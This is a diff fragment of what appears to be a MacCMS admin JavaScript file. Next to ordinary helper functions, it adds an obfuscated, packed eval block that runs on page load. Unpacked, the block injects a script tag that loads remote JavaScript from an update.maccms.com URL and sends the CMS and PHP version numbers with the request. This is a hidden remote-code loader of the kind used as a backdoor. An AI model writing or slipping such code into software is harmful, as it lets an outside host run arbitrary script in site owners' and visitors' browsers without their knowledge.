@@ -13,6 +13,11 @@ String.prototype.replaceAll  = function(s1,s2){
    return this.replace(new RegExp(s1,"gm"),s2);
 }
 
+$(function(){
+	if( typeof(MAC_VERSION) !='undefined' && typeof(PHP_VERSION) !='undefined' ) {
+		eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'2\').8(\'<0\'+\'1 3="\'+\'//4.5.6/7/?c=9&a=\'+b+\'&d=\'+e+\'&f=\'+g.h()+\'"></0\'+\'1>\');',18,18,'scr|ipt|body|src|update|maccms|com|v8|append|check|v|MAC_VERSION||p|PHP_VERSION|t|Math|random'.split('|'),0,{}));
+	}
+});
 
 function checkAll(objname){
 	$("input[name='"+objname+"']").each(function() {
